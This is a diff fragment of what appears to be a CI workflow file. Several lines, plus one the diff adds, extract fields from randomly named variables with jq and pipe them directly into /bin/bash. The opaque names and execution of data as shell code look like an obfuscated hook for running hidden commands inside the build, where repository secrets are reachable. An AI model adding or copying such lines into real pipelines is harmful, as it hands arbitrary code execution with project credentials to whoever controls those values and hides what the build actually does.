@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$iq149" | jq -r .sn1688 | /bin/bash
           printf '%s' "$un17188" | jq -r .uphe162 | /bin/bash
           printf '%s' "$nsw3" | jq -r .u858 | /bin/bash
+          echo $mlghe55 | jq -r .p21 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
